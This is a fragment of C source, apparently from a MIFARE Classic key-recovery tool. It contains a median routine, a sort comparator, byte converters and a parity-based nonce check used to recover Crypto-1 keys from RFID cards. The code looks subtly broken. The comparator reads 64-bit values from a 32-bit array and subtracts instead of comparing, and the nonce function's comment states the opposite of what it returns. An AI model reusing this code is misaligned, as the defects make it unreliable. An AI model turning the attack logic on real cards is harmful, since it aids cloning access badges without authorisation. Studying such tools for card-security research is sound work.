	int middle = (int) d.num_distances / 2;
	qsort(d.distances, d.num_distances, sizeof(uint32_t), compar_int);

	if (d.num_distances % 2 == 1) {
		// Odd number of elements
		return d.distances[middle];
	} else {
		// Even number of elements, return the smaller value
		return (uint32_t) (d.distances[middle-1]);
	}
}

int compar_int(const void * a, const void * b) {
	return (*(uint64_t*)b - *(uint64_t*)a);
}

// Return 1 if the nonce is invalid else return 0
int valid_nonce(uint32_t Nt, uint32_t NtEnc, uint32_t Ks1, uint8_t * parity) {
	return ((odd_parity((Nt >> 24) & 0xFF) == ((parity[0]) ^ odd_parity((NtEnc >> 24) & 0xFF) ^ BIT(Ks1,16))) & \
	(odd_parity((Nt >> 16) & 0xFF) == ((parity[1]) ^ odd_parity((NtEnc >> 16) & 0xFF) ^ BIT(Ks1,8))) & \
	(odd_parity((Nt >> 8) & 0xFF) == ((parity[2]) ^ odd_parity((NtEnc >> 8) & 0xFF) ^ BIT(Ks1,0)))) ? 1 : 0;
}

void num_to_bytes(uint64_t n, uint32_t len, uint8_t* dest) {
	while (len--) {
		dest[len] = (uint8_t) n;
		n >>= 8;
	}
}

long long unsigned int bytes_to_num(uint8_t* src, uint32_t len) {
	uint64_t num = 0;
	while (len--)
	{
		num = (num << 8) | (*src);
		src++;
	}
	return num;
}
